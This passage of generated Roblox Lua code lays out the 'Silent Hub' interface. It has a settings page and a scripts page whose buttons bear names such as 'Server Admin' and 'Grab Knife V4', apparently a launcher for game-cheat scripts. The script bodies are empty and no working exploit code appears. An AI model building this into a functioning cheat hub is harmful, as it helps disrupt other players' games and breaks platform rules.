G2L["b8"] = Instance.new("TextLabel", G2L["b5"]);
G2L["b8"]["TextWrapped"] = true;
G2L["b8"]["BorderSizePixel"] = 0;
G2L["b8"]["TextSize"] = 14;
G2L["b8"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["b8"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["b8"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["b8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b8"]["BackgroundTransparency"] = 1;
G2L["b8"]["Size"] = UDim2.new(0, 12, 0, 154);
G2L["b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b8"]["Text"] = [[1 3 3 7]];
G2L["b8"]["Name"] = [[LineAmount]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings
G2L["b9"] = Instance.new("Frame", G2L["6"]);
G2L["b9"]["Visible"] = false;
G2L["b9"]["BorderSizePixel"] = 0;
G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["b9"]["Size"] = UDim2.new(0, 500, 0, 223);
G2L["b9"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b9"]["Name"] = [[Settings]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main
G2L["ba"] = Instance.new("Frame", G2L["b9"]);
G2L["ba"]["BorderSizePixel"] = 0;
G2L["ba"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["ba"]["Size"] = UDim2.new(0, 300, 0, 188);
G2L["ba"]["Position"] = UDim2.new(0.4, 0, 0.15695, 0);
G2L["ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ba"]["Name"] = [[Main]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button
G2L["bb"] = Instance.new("TextButton", G2L["ba"]);
G2L["bb"]["TextWrapped"] = true;
G2L["bb"]["BorderSizePixel"] = 0;
G2L["bb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bb"]["TextSize"] = 12;
G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["bb"]["RichText"] = true;
G2L["bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bb"]["Size"] = UDim2.new(0, 65, 0, 22);
G2L["bb"]["Name"] = [[Button]];
G2L["bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bb"]["Text"] = [[Set Window Color]];
G2L["bb"]["Position"] = UDim2.new(-0.3608, 0, 0.09574, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.LocalScript
G2L["bc"] = Instance.new("LocalScript", G2L["bb"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.Red
G2L["bd"] = Instance.new("TextBox", G2L["bb"]);
G2L["bd"]["Name"] = [[Red]];
G2L["bd"]["PlaceholderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["bd"]["BorderSizePixel"] = 0;
G2L["bd"]["TextWrapped"] = true;
G2L["bd"]["TextSize"] = 14;
G2L["bd"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bd"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["bd"]["RichText"] = true;
G2L["bd"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bd"]["PlaceholderText"] = [[Red]];
G2L["bd"]["Size"] = UDim2.new(0, 78, 0, 22);
G2L["bd"]["Position"] = UDim2.new(1, 0, -0.0087, 0);
G2L["bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bd"]["Text"] = [[]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.Red.UIStroke
G2L["be"] = Instance.new("UIStroke", G2L["bd"]);
G2L["be"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["be"]["Thickness"] = 1.8;
G2L["be"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.Green
G2L["bf"] = Instance.new("TextBox", G2L["bb"]);
G2L["bf"]["Name"] = [[Green]];
G2L["bf"]["PlaceholderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["bf"]["BorderSizePixel"] = 0;
G2L["bf"]["TextWrapped"] = true;
G2L["bf"]["TextSize"] = 14;
G2L["bf"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["bf"]["RichText"] = true;
G2L["bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bf"]["PlaceholderText"] = [[Green]];
G2L["bf"]["Size"] = UDim2.new(0, 78, 0, 22);
G2L["bf"]["Position"] = UDim2.new(2.23077, 0, -0.0087, 0);
G2L["bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bf"]["Text"] = [[]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.Green.UIStroke
G2L["c0"] = Instance.new("UIStroke", G2L["bf"]);
G2L["c0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c0"]["Thickness"] = 1.8;
G2L["c0"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.Blue
G2L["c1"] = Instance.new("TextBox", G2L["bb"]);
G2L["c1"]["Name"] = [[Blue]];
G2L["c1"]["PlaceholderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["c1"]["BorderSizePixel"] = 0;
G2L["c1"]["TextWrapped"] = true;
G2L["c1"]["TextSize"] = 14;
G2L["c1"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c1"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["c1"]["RichText"] = true;
G2L["c1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c1"]["PlaceholderText"] = [[Blue]];
G2L["c1"]["Size"] = UDim2.new(0, 78, 0, 22);
G2L["c1"]["Position"] = UDim2.new(3.43077, 0, -0.0087, 0);
G2L["c1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c1"]["Text"] = [[]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.Blue.UIStroke
G2L["c2"] = Instance.new("UIStroke", G2L["c1"]);
G2L["c2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c2"]["Thickness"] = 1.8;
G2L["c2"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.UIStroke
G2L["c3"] = Instance.new("UIStroke", G2L["bb"]);
G2L["c3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c3"]["Thickness"] = 1.8;
G2L["c3"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button
G2L["c4"] = Instance.new("TextButton", G2L["ba"]);
G2L["c4"]["TextWrapped"] = true;
G2L["c4"]["BorderSizePixel"] = 0;
G2L["c4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c4"]["TextSize"] = 12;
G2L["c4"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["c4"]["RichText"] = true;
G2L["c4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c4"]["Size"] = UDim2.new(0, 65, 0, 22);
G2L["c4"]["Name"] = [[Button]];
G2L["c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c4"]["Text"] = [[Set Window Transparency]];
G2L["c4"]["Position"] = UDim2.new(-0.3608, 0, 0.31383, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.LocalScript
G2L["c5"] = Instance.new("LocalScript", G2L["c4"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.TParency
G2L["c6"] = Instance.new("TextBox", G2L["c4"]);
G2L["c6"]["Name"] = [[TParency]];
G2L["c6"]["PlaceholderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["c6"]["BorderSizePixel"] = 0;
G2L["c6"]["TextWrapped"] = true;
G2L["c6"]["TextSize"] = 14;
G2L["c6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c6"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["c6"]["RichText"] = true;
G2L["c6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c6"]["PlaceholderText"] = [[Window Transparency]];
G2L["c6"]["Size"] = UDim2.new(0, 236, 0, 22);
G2L["c6"]["Position"] = UDim2.new(1, 0, -0.0087, 0);
G2L["c6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c6"]["Text"] = [[0.5]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.TParency.UIStroke
G2L["c7"] = Instance.new("UIStroke", G2L["c6"]);
G2L["c7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c7"]["Thickness"] = 1.8;
G2L["c7"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.UIStroke
G2L["c8"] = Instance.new("UIStroke", G2L["c4"]);
G2L["c8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c8"]["Thickness"] = 1.8;
G2L["c8"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button
G2L["c9"] = Instance.new("TextButton", G2L["ba"]);
G2L["c9"]["TextWrapped"] = true;
G2L["c9"]["BorderSizePixel"] = 0;
G2L["c9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c9"]["TextSize"] = 12;
G2L["c9"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["c9"]["RichText"] = true;
G2L["c9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c9"]["Size"] = UDim2.new(0, 65, 0, 22);
G2L["c9"]["Name"] = [[Button]];
G2L["c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c9"]["Text"] = [[Set GUI Scale]];
G2L["c9"]["Position"] = UDim2.new(-0.3608, 0, 0.53723, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.LocalScript
G2L["ca"] = Instance.new("LocalScript", G2L["c9"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.ScaleInput
G2L["cb"] = Instance.new("TextBox", G2L["c9"]);
G2L["cb"]["Name"] = [[ScaleInput]];
G2L["cb"]["PlaceholderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["cb"]["BorderSizePixel"] = 0;
G2L["cb"]["TextWrapped"] = true;
G2L["cb"]["TextSize"] = 14;
G2L["cb"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cb"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["cb"]["RichText"] = true;
G2L["cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cb"]["PlaceholderText"] = [[GUI Scale]];
G2L["cb"]["Size"] = UDim2.new(0, 236, 0, 22);
G2L["cb"]["Position"] = UDim2.new(1, 0, -0.0087, 0);
G2L["cb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cb"]["Text"] = [[1]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.ScaleInput.UIStroke
G2L["cc"] = Instance.new("UIStroke", G2L["cb"]);
G2L["cc"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["cc"]["Thickness"] = 1.8;
G2L["cc"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.UIStroke
G2L["cd"] = Instance.new("UIStroke", G2L["c9"]);
G2L["cd"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["cd"]["Thickness"] = 1.8;
G2L["cd"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button
G2L["ce"] = Instance.new("TextButton", G2L["ba"]);
G2L["ce"]["TextWrapped"] = true;
G2L["ce"]["BorderSizePixel"] = 0;
G2L["ce"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ce"]["TextSize"] = 12;
G2L["ce"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["ce"]["RichText"] = true;
G2L["ce"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ce"]["Size"] = UDim2.new(0, 150, 0, 22);
G2L["ce"]["Name"] = [[Button]];
G2L["ce"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ce"]["Text"] = [[Reset Window]];
G2L["ce"]["Position"] = UDim2.new(-0.3608, 0, 0.77128, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.LocalScript
G2L["cf"] = Instance.new("LocalScript", G2L["ce"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.UIStroke
G2L["d0"] = Instance.new("UIStroke", G2L["ce"]);
G2L["d0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["d0"]["Thickness"] = 1.8;
G2L["d0"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button
G2L["d1"] = Instance.new("TextButton", G2L["ba"]);
G2L["d1"]["TextWrapped"] = true;
G2L["d1"]["BorderSizePixel"] = 0;
G2L["d1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d1"]["TextSize"] = 12;
G2L["d1"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["d1"]["RichText"] = true;
G2L["d1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d1"]["Size"] = UDim2.new(0, 150, 0, 22);
G2L["d1"]["Name"] = [[Button]];
G2L["d1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d1"]["Text"] = [[Destroy GUI]];
G2L["d1"]["Position"] = UDim2.new(0.14253, 0, 0.77128, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.LocalScript
G2L["d2"] = Instance.new("LocalScript", G2L["d1"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.UIStroke
G2L["d3"] = Instance.new("UIStroke", G2L["d1"]);
G2L["d3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["d3"]["Thickness"] = 1.8;
G2L["d3"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts
G2L["d4"] = Instance.new("Frame", G2L["6"]);
G2L["d4"]["Visible"] = false;
G2L["d4"]["BorderSizePixel"] = 0;
G2L["d4"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["d4"]["Size"] = UDim2.new(0, 500, 0, 223);
G2L["d4"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["d4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d4"]["Name"] = [[Scripts]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main
G2L["d5"] = Instance.new("Frame", G2L["d4"]);
G2L["d5"]["BorderSizePixel"] = 0;
G2L["d5"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["d5"]["Size"] = UDim2.new(0, 300, 0, 188);
G2L["d5"]["Position"] = UDim2.new(0.4, 0, 0.15695, 0);
G2L["d5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d5"]["Name"] = [[Main]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Input
G2L["d6"] = Instance.new("TextBox", G2L["d5"]);
G2L["d6"]["Name"] = [[Input]];
G2L["d6"]["PlaceholderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["d6"]["BorderSizePixel"] = 0;
G2L["d6"]["TextWrapped"] = true;
G2L["d6"]["TextSize"] = 14;
G2L["d6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d6"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["d6"]["RichText"] = true;
G2L["d6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d6"]["PlaceholderText"] = [[Search Scripts]];
G2L["d6"]["Size"] = UDim2.new(0, 235, 0, 20);
G2L["d6"]["Position"] = UDim2.new(-0.22667, 0, 0.13298, 0);
G2L["d6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d6"]["Text"] = [[]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Input.LocalScript
G2L["d7"] = Instance.new("LocalScript", G2L["d6"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Input.UIStroke
G2L["d8"] = Instance.new("UIStroke", G2L["d6"]);
G2L["d8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["d8"]["Thickness"] = 1.8;
G2L["d8"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent
G2L["d9"] = Instance.new("ScrollingFrame", G2L["d5"]);
G2L["d9"]["Active"] = true;
G2L["d9"]["BorderSizePixel"] = 0;
G2L["d9"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["d9"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["d9"]["Name"] = [[Dependent]];
G2L["d9"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["d9"]["Size"] = UDim2.new(0, 499, 0, 120);
G2L["d9"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d9"]["Position"] = UDim2.new(-0.66667, 0, 0.35991, 0);
G2L["d9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d9"]["ScrollBarThickness"] = 5;


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.UIListLayout
G2L["da"] = Instance.new("UIListLayout", G2L["d9"]);
G2L["da"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["da"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["da"]["Padding"] = UDim.new(0.05, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Spectrum Glitcher
G2L["db"] = Instance.new("TextButton", G2L["d9"]);
G2L["db"]["TextWrapped"] = true;
G2L["db"]["BorderSizePixel"] = 0;
G2L["db"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["db"]["TextSize"] = 12;
G2L["db"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["db"]["RichText"] = true;
G2L["db"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["db"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["db"]["Name"] = [[Spectrum Glitcher]];
G2L["db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["db"]["Text"] = [[Spectrum Glitcher (R6)]];
G2L["db"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Spectrum Glitcher.LocalScript
G2L["dc"] = Instance.new("LocalScript", G2L["db"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Spectrum Glitcher.UIStroke
G2L["dd"] = Instance.new("UIStroke", G2L["db"]);
G2L["dd"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["dd"]["Thickness"] = 1.8;
G2L["dd"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Server Admin
G2L["de"] = Instance.new("TextButton", G2L["d9"]);
G2L["de"]["TextWrapped"] = true;
G2L["de"]["BorderSizePixel"] = 0;
G2L["de"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["de"]["TextSize"] = 12;
G2L["de"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["de"]["RichText"] = true;
G2L["de"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["de"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["de"]["Name"] = [[Server Admin]];
G2L["de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["de"]["Text"] = [[Server Admin (R6)]];
G2L["de"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Server Admin.LocalScript
G2L["df"] = Instance.new("LocalScript", G2L["de"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Server Admin.UIStroke
G2L["e0"] = Instance.new("UIStroke", G2L["de"]);
G2L["e0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["e0"]["Thickness"] = 1.8;
G2L["e0"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Black Angel
G2L["e1"] = Instance.new("TextButton", G2L["d9"]);
G2L["e1"]["TextWrapped"] = true;
G2L["e1"]["BorderSizePixel"] = 0;
G2L["e1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e1"]["TextSize"] = 12;
G2L["e1"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["e1"]["RichText"] = true;
G2L["e1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e1"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["e1"]["Name"] = [[Black Angel]];
G2L["e1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e1"]["Text"] = [[Black Angel (R6)]];
G2L["e1"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Black Angel.LocalScript
G2L["e2"] = Instance.new("LocalScript", G2L["e1"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Black Angel.UIStroke
G2L["e3"] = Instance.new("UIStroke", G2L["e1"]);
G2L["e3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["e3"]["Thickness"] = 1.8;
G2L["e3"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Grab Knife
G2L["e4"] = Instance.new("TextButton", G2L["d9"]);
G2L["e4"]["TextWrapped"] = true;
G2L["e4"]["BorderSizePixel"] = 0;
G2L["e4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e4"]["TextSize"] = 12;
G2L["e4"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["e4"]["RichText"] = true;
G2L["e4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e4"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["e4"]["Name"] = [[Grab Knife]];
G2L["e4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e4"]["Text"] = [[Grab Knife V4 (R6)]];
G2L["e4"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Grab Knife.LocalScript
G2L["e5"] = Instance.new("LocalScript", G2L["e4"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Grab Knife.UIStroke
G2L["e6"] = Instance.new("UIStroke", G2L["e4"]);
G2L["e6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["e6"]["Thickness"] = 1.8;
G2L["e6"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Lua Hammer
G2L["e7"] = Instance.new("TextButton", G2L["d9"]);
G2L["e7"]["TextWrapped"] = true;
G2L["e7"]["BorderSizePixel"] = 0;
G2L["e7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e7"]["TextSize"] = 12;
G2L["e7"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["e7"]["RichText"] = true;
G2L["e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e7"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["e7"]["Name"] = [[Lua Hammer]];
G2L["e7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e7"]["Text"] = [[Lua Hammer (R6)]];
G2L["e7"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Lua Hammer.LocalScript
G2L["e8"] = Instance.new("LocalScript", G2L["e7"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Lua Hammer.UIStroke
G2L["e9"] = Instance.new("UIStroke", G2L["e7"]);
G2L["e9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["e9"]["Thickness"] = 1.8;
G2L["e9"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Xester
G2L["ea"] = Instance.new("TextButton", G2L["d9"]);
G2L["ea"]["TextWrapped"] = true;
G2L["ea"]["BorderSizePixel"] = 0;
G2L["ea"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ea"]["TextSize"] = 12;
G2L["ea"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["ea"]["RichText"] = true;
G2L["ea"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ea"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["ea"]["Name"] = [[Xester]];
G2L["ea"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ea"]["Text"] = [[Xester (R6)]];
G2L["ea"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Xester.LocalScript
G2L["eb"] = Instance.new("LocalScript", G2L["ea"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Xester.UIStroke
G2L["ec"] = Instance.new("UIStroke", G2L["ea"]);
G2L["ec"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["ec"]["Thickness"] = 1.8;
G2L["ec"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Dual Ultima
G2L["ed"] = Instance.new("TextButton", G2L["d9"]);
G2L["ed"]["TextWrapped"] = true;
G2L["ed"]["BorderSizePixel"] = 0;
G2L["ed"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ed"]["TextSize"] = 12;
G2L["ed"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["ed"]["RichText"] = true;
G2L["ed"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ed"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["ed"]["Name"] = [[Dual Ultima]];
G2L["ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ed"]["Text"] = [[Dual Ultima (R6)]];
G2L["ed"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Dual Ultima.LocalScript
G2L["ee"] = Instance.new("LocalScript", G2L["ed"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Dual Ultima.UIStroke
G2L["ef"] = Instance.new("UIStroke", G2L["ed"]);
G2L["ef"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
